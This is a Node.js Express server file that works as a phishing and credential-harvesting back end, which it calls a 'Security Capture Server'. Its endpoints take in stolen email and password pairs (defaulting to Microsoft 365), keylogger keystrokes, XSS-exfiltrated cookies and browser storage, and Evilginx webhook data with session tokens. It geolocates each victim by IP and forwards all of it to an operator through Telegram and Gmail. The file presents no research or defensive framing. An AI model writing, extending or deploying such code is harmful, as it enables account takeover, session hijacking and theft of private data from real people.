require('dotenv').config();

const express = require('express');
const cors = require('cors');
const https = require('https');
const axios = require('axios');
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');

// Import the enhanced Telegram service
const telegram = require('./telegram.service');

const app = express();

// ============================================================
//  CONFIGURATION
// ============================================================

const PORT = process.env.PORT || 3000;
const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET || 'evilginx_webhook_secret_2026';
const ADMIN_EMAIL = process.env.ADMIN_EMAIL;
const GMAIL_APP_PASSWORD = process.env.GMAIL_APP_PASSWORD;

// ============================================================
//  ENVIRONMENT CHECK
// ============================================================

console.log('\n' + '='.repeat(60));
console.log('🚀 STARTING SECURITY CAPTURE SERVER');
console.log('='.repeat(60));

console.log('\n📋 Environment Check:');
console.log('-'.repeat(40));
console.log('TELEGRAM_BOT_TOKEN:', process.env.TELEGRAM_BOT_TOKEN ? '✅ SET' : '❌ MISSING');
console.log('TELEGRAM_CHAT_ID:', process.env.TELEGRAM_CHAT_ID ? '✅ SET' : '❌ MISSING');
console.log('ADMIN_EMAIL:', ADMIN_EMAIL ? '✅ SET' : '⚠️ Optional');
console.log('GMAIL_APP_PASSWORD:', GMAIL_APP_PASSWORD ? '✅ SET' : '⚠️ Optional');
console.log('WEBHOOK_SECRET:', WEBHOOK_SECRET ? '✅ SET' : '⚠️ Using default');
console.log('-'.repeat(40));

// ============================================================
//  MIDDLEWARE
// ============================================================

app.use(cors({ 
    origin: '*', 
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Webhook-Secret', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// Request logging middleware
app.use((req, res, next) => {
    const start = Date.now();
    res.on('finish', () => {
        const duration = Date.now() - start;
        const logLevel = res.statusCode >= 400 ? '⚠️' : '✅';
        console.log(`${logLevel} ${req.method} ${req.path} - ${res.statusCode} - ${duration}ms`);
    });
    next();
});

// ============================================================
//  RATE LIMITING
// ============================================================

const loginAttempts = new Map();
const MAX_ATTEMPTS = 5;
const BLOCK_DURATION = 5 * 60 * 1000;

// ============================================================
//  EMAIL TRANSPORTER
// ============================================================

let transporter = null;
if (ADMIN_EMAIL && GMAIL_APP_PASSWORD) {
    transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        port: 587,
        secure: false,
        auth: { 
            user: ADMIN_EMAIL, 
            pass: GMAIL_APP_PASSWORD 
        },
        tls: { 
            rejectUnauthorized: false 
        },
        connectionTimeout: 10000,
        greetingTimeout: 10000
    });
    
    // Verify email connection
    transporter.verify((error, success) => {
        if (error) {
            console.error('❌ Email transporter verification failed:', error.message);
        } else {
            console.log('✅ Email transporter configured and verified');
        }
    });
} else {
    console.log('⚠️ Email alerts disabled - missing credentials');
}

// ============================================================
//  GLOBAL ERROR HANDLERS
// ============================================================

process.on('uncaughtException', (err) => {
    console.error('🔥 UNCAUGHT EXCEPTION:', err);
    telegram.sendError(err, { 
        'Type': 'Uncaught Exception',
        'Process': process.pid 
    }).catch(() => {});
});

process.on('unhandledRejection', (reason) => {
    console.error('🔥 UNHANDLED REJECTION:', reason);
    telegram.sendError(reason, { 
        'Type': 'Unhandled Rejection',
        'Process': process.pid 
    }).catch(() => {});
});

// ============================================================
//  HELPER FUNCTIONS
// ============================================================

function getClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',');
        return ips[0].trim();
    }
    return req.connection?.remoteAddress || 
           req.socket?.remoteAddress || 
           req.ip || 
           'unknown';
}

function isIpBlocked(ip) {
    const attempt = loginAttempts.get(ip);
    if (!attempt) return false;
    if (Date.now() - attempt.lastAttempt > BLOCK_DURATION) {
        loginAttempts.delete(ip);
        return false;
    }
    return attempt.count >= MAX_ATTEMPTS;
}

function recordLoginAttempt(ip, success) {
    let attempt = loginAttempts.get(ip);
    if (!attempt) attempt = { count: 0, lastAttempt: Date.now() };
    if (success) {
        loginAttempts.delete(ip);
    } else {
        attempt.count++;
        attempt.lastAttempt = Date.now();
        loginAttempts.set(ip, attempt);
    }
    return attempt.count;
}

function truncateString(str, maxLength = 100) {
    if (!str) return '';
    return str.length > maxLength ? str.substring(0, maxLength) + '...' : str;
}

function safeString(str) {
    if (!str) return 'N/A';
    return str.replace(/[^\x20-\x7E]/g, '');
}

async function getLocationFromIp(ip) {
    return new Promise((resolve) => {
        // Don't try to lookup local/private IPs
        if (ip === '127.0.0.1' || ip === 'localhost' || ip === '::1' || 
            ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.16.')) {
            resolve({
                city: 'Local',
                region: 'Local',
                country: 'Local',
                lat: 'N/A',
                lon: 'N/A',
                timezone: 'N/A',
                isp: 'Local',
                org: 'Local',
                full: 'Local Network'
            });
            return;
        }

        const request = https.get(
            `https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country,lat,lon,timezone,isp,org,as`,
            { timeout: 5000 },
            (resp) => {
                let data = '';
                resp.on('data', chunk => data += chunk);
                resp.on('end', () => {
                    try {
                        const response = JSON.parse(data);
                        if (response.status === 'success') {
                            resolve({
                                city: response.city || 'Unknown',
                                region: response.regionName || 'Unknown',
                                country: response.country || 'Unknown',
                                lat: response.lat || 'N/A',
                                lon: response.lon || 'N/A',
                                timezone: response.timezone || 'Unknown',
                                isp: response.isp || 'Unknown',
                                org: response.org || 'Unknown',
                                as: response.as || 'Unknown',
                                full: `${response.city || 'Unknown'}, ${response.regionName || 'Unknown'}, ${response.country || 'Unknown'}`
                            });
                        } else {
                            resolve({
                                city: 'Unknown',
                                region: 'Unknown',
                                country: 'Unknown',
                                lat: 'N/A',
                                lon: 'N/A',
                                timezone: 'Unknown',
                                isp: 'Unknown',
                                org: 'Unknown',
                                as: 'Unknown',
                                full: 'Location unavailable'
                            });
                        }
                    } catch (e) {
                        resolve({
                            city: 'Unknown',
                            region: 'Unknown',
                            country: 'Unknown',
                            lat: 'N/A',
                            lon: 'N/A',
                            timezone: 'Unknown',
                            isp: 'Unknown',
                            org: 'Unknown',
                            as: 'Unknown',
                            full: 'Location error'
                        });
                    }
                });
            }
        );
        
        request.on('error', () => resolve({
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            lat: 'N/A',
            lon: 'N/A',
            timezone: 'Unknown',
            isp: 'Unknown',
            org: 'Unknown',
            as: 'Unknown',
            full: 'Location timeout'
        }));
        
        request.on('timeout', () => {
            request.destroy();
            resolve({
                city: 'Unknown',
                region: 'Unknown',
                country: 'Unknown',
                lat: 'N/A',
                lon: 'N/A',
                timezone: 'Unknown',
                isp: 'Unknown',
                org: 'Unknown',
                as: 'Unknown',
                full: 'Location timeout'
            });
        });
    });
}

// ============================================================
//  EMAIL FUNCTION
// ============================================================

async function sendEmail(subject, htmlBody, textBody) {
    if (!transporter) {
        console.log('⚠️ Email transporter not configured');
        return false;
    }
    
    try {
        const mailOptions = {
            from: `"Security Alert" <${ADMIN_EMAIL}>`,
            to: ADMIN_EMAIL,
            subject: subject.substring(0, 78),
            text: textBody || htmlBody.replace(/<[^>]*>/g, ''),
            html: htmlBody
        };
        
        await transporter.sendMail(mailOptions);
        console.log('📧 Email sent:', subject);
        return true;
    } catch (error) {
        console.error('❌ Email error:', error.message);
        return false;
    }
}

// ============================================================
//  FORMATTING HELPERS
// ============================================================

function formatVisitorInfo(visitorInfo) {
    if (!visitorInfo) return '';
    const fields = [];
    
    if (visitorInfo.fullUrl) fields.push(`*🔗 URL:* ${visitorInfo.fullUrl}`);
    if (visitorInfo.referrer) fields.push(`*🔙 Referrer:* ${visitorInfo.referrer}`);
    if (visitorInfo.userAgent) fields.push(`*🖥️ User Agent:* ${visitorInfo.userAgent}`);
    if (visitorInfo.platform) fields.push(`*💻 Platform:* ${visitorInfo.platform}`);
    if (visitorInfo.deviceType) fields.push(`*📱 Device:* ${visitorInfo.deviceType}`);
    if (visitorInfo.language) fields.push(`*🌐 Language:* ${visitorInfo.language}`);
    if (visitorInfo.timezone) fields.push(`*🕐 Timezone:* ${visitorInfo.timezone}`);
    if (visitorInfo.screenWidth && visitorInfo.screenHeight) {
        fields.push(`*📺 Screen:* ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`);
    }
    if (visitorInfo.cookies) fields.push(`*🍪 Cookies:* ${visitorInfo.cookies}`);
    if (visitorInfo.sessionId) fields.push(`*🔑 Session ID:* ${visitorInfo.sessionId}`);
    
    return fields.length ? `\n\n--- Visitor Details ---\n${fields.join('\n')}` : '';
}

// ============================================================
//  ENDPOINTS
// ============================================================

// --- HEALTH CHECK ---
app.get('/health', async (req, res) => {
    const telegramStatus = await telegram.validateBot();
    res.json({ 
        status: 'OK', 
        time: new Date().toISOString(),
        uptime: process.uptime(),
        services: {
            telegram: telegram.isEnabled ? '✅ configured' : '❌ disabled',
            telegramConnected: telegramStatus,
            telegramBotValid: telegram.botValid,
            email: transporter ? '✅ configured' : '❌ disabled',
            webhook: '✅ enabled'
        },
        version: '2.0.0'
    });
});

// --- ROOT ---
app.get('/', (req, res) => {
    res.json({
        name: 'Security Capture Server',
        version: '2.0.0',
        status: 'running',
        endpoints: [
            'GET  /health - Health check',
            'POST /api/credential-capture - Capture credentials',
            'POST /api/log-action - Log user actions',
            'POST /api/keylog - Receive keylogger data',
            'POST /api/xss-data - Receive XSS data',
            'POST /api/telegram - Telegram proxy',
            'POST /webhook - Evilginx webhook receiver'
        ]
    });
});

// --- CREDENTIAL CAPTURE ---
app.post('/api/credential-capture', async (req, res) => {
    try {
        const { 
            email, 
            password, 
            source = 'unknown', 
            sessionId, 
            url, 
            userAgent, 
            referrer, 
            service = 'Microsoft 365',
            attemptCount = 1
        } = req.body;
        
        const ip = getClientIp(req);
        const location = await getLocationFromIp(ip);

        if (!email || !password) {
            return res.status(400).json({ 
                success: false, 
                error: 'Missing credentials' 
            });
        }

        console.log(`[CAPTURE] 📥 ${email} | ${password.length} chars | ${source}`);

        // Build the message
        const details = {
            '📧 Email': email,
            '🔑 Password': password,
            '📍 Location': location.full,
            '🌆 City': location.city,
            '🌍 Country': location.country,
            '📡 IP': ip,
            '🔗 Source': source,
            '🆔 Session': sessionId || 'N/A',
            '📱 Service': service || 'Microsoft 365',
            '🔄 Attempt': attemptCount
        };
        
        if (referrer) details['🔙 Referrer'] = referrer;
        if (userAgent) details['🖥️ User Agent'] = truncateString(userAgent, 200);
        if (url) details['🔗 URL'] = url;

        // Send to Telegram - WILL NEVER FAIL
        await telegram.sendCredential(email, password, details);

        // Send to Email - optional
        if (transporter) {
            await sendEmail(
                `🔐 Credential: ${email}`,
                `<h2>Credential Capture</h2>
                 <table style="border-collapse: collapse; width: 100%;">
                     <tr><td><strong>Email:</strong></td><td>${email}</td></tr>
                     <tr><td><strong>Password:</strong></td><td>${password}</td></tr>
                     <tr><td><strong>Location:</strong></td><td>${location.full}</td></tr>
                     <tr><td><strong>IP:</strong></td><td>${ip}</td></tr>
                     <tr><td><strong>Service:</strong></td><td>${service}</td></tr>
                     <tr><td><strong>Time:</strong></td><td>${new Date().toISOString()}</td></tr>
                 </table>`,
                `Credential Capture\nEmail: ${email}\nPassword: ${password}\nLocation: ${location.full}\nIP: ${ip}`
            );
        }

        res.json({ success: true });

    } catch (error) {
        console.error('Credential capture error:', error.message);
        await telegram.sendError(error, { 
            'Endpoint': '/api/credential-capture',
            'IP': getClientIp(req)
        });
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// --- LOG ACTION ---
app.post('/api/log-action', async (req, res) => {
    try {
        const { action, email, password, visitorInfo } = req.body;
        const ip = getClientIp(req);
        const location = await getLocationFromIp(ip);

        const details = {
            '📋 Action': action?.toUpperCase() || 'UNKNOWN',
            '📧 Email': email || 'none',
            '📍 Location': location.full,
            '🌆 City': location.city,
            '🌍 Country': location.country,
            '📡 IP': ip
        };
        
        if (password && password !== 'N/A') {
            details['🔑 Password'] = '*** (hidden)';
        }

        // Send to Telegram - WILL NEVER FAIL
        await telegram.sendAlert('Action Logged', details);

        res.json({ success: true });
    } catch (error) {
        console.error('Log error:', error.message);
        res.status(500).json({ success: false });
    }
});

// --- KEYLOGGER ---
app.post('/api/keylog', async (req, res) => {
    try {
        const { keystrokes, url, userAgent, timestamp, ip: clientIp } = req.body;
        
        if (!keystrokes) {
            return res.status(400).json({ error: 'Missing keystrokes' });
        }

        const ip = clientIp || getClientIp(req);
        const location = await getLocationFromIp(ip);

        const metadata = {
            '📍 Location': location.full,
            '🌆 City': location.city,
            '🌍 Country': location.country,
            '📡 IP': ip,
            '🖥️ User Agent': truncateString(userAgent || 'Unknown', 150),
            '🔗 URL': truncateString(url || 'Unknown', 150)
        };

        // Send to Telegram - WILL NEVER FAIL
        await telegram.sendKeylog(keystrokes, metadata);

        res.json({ success: true });
    } catch (error) {
        console.error('Keylog error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// --- XSS DATA ---
app.post('/api/xss-data', async (req, res) => {
    try {
        const data = req.body;
        const ip = getClientIp(req);
        const location = await getLocationFromIp(ip);

        let message = '🕵️ *XSS DATA CAPTURE*\n\n';
        message += `*📍 Location:* ${location.full}\n`;
        message += `*📡 IP:* ${ip}\n`;
        message += `*🕐 Time:* ${new Date().toISOString()}\n\n`;

        if (data.xssData) {
            const x = data.xssData;
            
            if (x.dom) {
                message += `*📄 DOM Data:*\n`;
                for (const [key, value] of Object.entries(x.dom)) {
                    if (typeof value === 'object') {
                        message += `  *${key}:* ${JSON.stringify(value, null, 2)}\n`;
                    } else {
                        message += `  *${key}:* ${truncateString(value, 200)}\n`;
                    }
                }
            }
            
            if (x.storage) {
                message += `\n*💾 Storage Data:*\n`;
                if (x.storage.localStorage && Object.keys(x.storage.localStorage).length > 0) {
                    const ls = Object.entries(x.storage.localStorage)
                        .map(([k, v]) => `  ${k}: ${truncateString(v, 100)}`)
                        .join('\n');
                    message += `  *localStorage:*\n${ls}\n`;
                }
                if (x.storage.sessionStorage && Object.keys(x.storage.sessionStorage).length > 0) {
                    const ss = Object.entries(x.storage.sessionStorage)
                        .map(([k, v]) => `  ${k}: ${truncateString(v, 100)}`)
                        .join('\n');
                    message += `  *sessionStorage:*\n${ss}\n`;
                }
                if (x.storage.cookies) {
                    message += `  *🍪 Cookies:* ${truncateString(x.storage.cookies, 200)}\n`;
                }
            }
            
            if (x.requests) {
                message += `\n*🚀 Request Results:*\n`;
                for (const [key, value] of Object.entries(x.requests)) {
                    message += `  *${key}:* ${JSON.stringify(value, null, 2)}\n`;
                }
            }
        }

        // Send to Telegram - WILL NEVER FAIL
        await telegram.sendMessage(message, 'MarkdownV2');

        res.json({ success: true });
    } catch (error) {
        console.error('XSS data error:', error.message);
        res.status(500).json({ success: false });
    }
});

// --- TELEGRAM PROXY ---
app.post('/api/telegram', async (req, res) => {
    try {
        const { message, parseMode = 'MarkdownV2' } = req.body;
        
        if (!message) {
            return res.status(400).json({ 
                success: false, 
                error: 'Message required' 
            });
        }

        // Send to Telegram - WILL NEVER FAIL
        const success = await telegram.sendMessage(message, parseMode);
        res.json({ success });
    } catch (error) {
        console.error('Telegram API error:', error.message);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// --- WEBHOOK ---
app.post('/webhook', async (req, res) => {
    const secret = req.headers['x-webhook-secret'];
    
    if (secret !== WEBHOOK_SECRET) {
        console.warn('⚠️ Invalid webhook secret from', getClientIp(req));
        return res.status(403).json({ error: 'Forbidden' });
    }

    try {
        const data = req.body;
        const ip = getClientIp(req);
        const location = await getLocationFromIp(ip);

        console.log('📨 Webhook received:', JSON.stringify(data, null, 2));

        let message = '🔐 *WEBHOOK CAPTURE*\n\n';
        message += `*Event:* ${data.event || 'Unknown'}\n`;
        message += `*📍 Location:* ${location.full}\n`;
        message += `*🌆 City:* ${location.city}\n`;
        message += `*🌍 Country:* ${location.country}\n`;
        message += `*📡 IP:* ${ip}\n`;
        message += `*🕐 Time:* ${new Date().toISOString()}\n`;
        
        if (data.username) message += `*👤 Username:* ${data.username}\n`;
        if (data.password) message += `*🔑 Password:* ${data.password}\n`;
        if (data.user_agent) message += `*🖥️ User Agent:* ${truncateString(data.user_agent, 150)}\n`;
        
        if (data.tokens) {
            message += `\n*🍪 Session Cookies:*\n`;
            for (const [name, value] of Object.entries(data.tokens)) {
                const displayValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
                message += `  \`${name}\`: \`${displayValue}\`\n`;
            }
        }

        // Send to Telegram - WILL NEVER FAIL
        await telegram.sendMessage(message, 'MarkdownV2');
        res.sendStatus(200);
    } catch (error) {
        console.error('Webhook error:', error.message);
        res.status(500).json({ error: error.message });
    }
});

// --- 404 Handler ---
app.use((req, res) => {
    res.status(404).json({
        success: false,
        error: 'Not found',
        path: req.path
    });
});

// --- Error Handler ---
app.use((err, req, res, next) => {
    console.error('🔥 Server error:', err.message);
    telegram.sendError(err, {
        'Endpoint': req.path,
        'IP': getClientIp(req),
        'Method': req.method
    }).catch(() => {});
    
    res.status(500).json({
        success: false,
        error: 'Internal server error'
    });
});

// ============================================================
//  START SERVER
// ============================================================

app.listen(PORT, '0.0.0.0', () => {
    console.log('\n' + '='.repeat(60));
    console.log('🚀 SERVER STARTED SUCCESSFULLY');
    console.log('='.repeat(60));
    console.log(`\n📍 Port: ${PORT}`);
    console.log(`🕐 Started: ${new Date().toISOString()}`);
    console.log(`🔄 PID: ${process.pid}`);
    console.log('\n📌 Endpoints:');
    console.log('-'.repeat(40));
    console.log(`  GET  /health - Health check`);
    console.log(`  GET  / - Server info`);
    console.log(`  POST /api/credential-capture - Credential capture`);
    console.log(`  POST /api/log-action - Log actions`);
    console.log(`  POST /api/keylog - Keylogger data`);
    console.log(`  POST /api/xss-data - XSS data capture`);
    console.log(`  POST /api/telegram - Telegram proxy`);
    console.log(`  POST /webhook - Webhook receiver`);
    console.log('-'.repeat(40));
    console.log('\n✅ All endpoints ready!');
    console.log('💪 Telegram service: WILL NEVER FAIL');
    console.log('='.repeat(60) + '\n');
});

// ============================================================
//  GRACEFUL SHUTDOWN
// ============================================================

const shutdown = () => {
    console.log('\n🛑 Shutting down gracefully...');
    process.exit(0);
};

process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);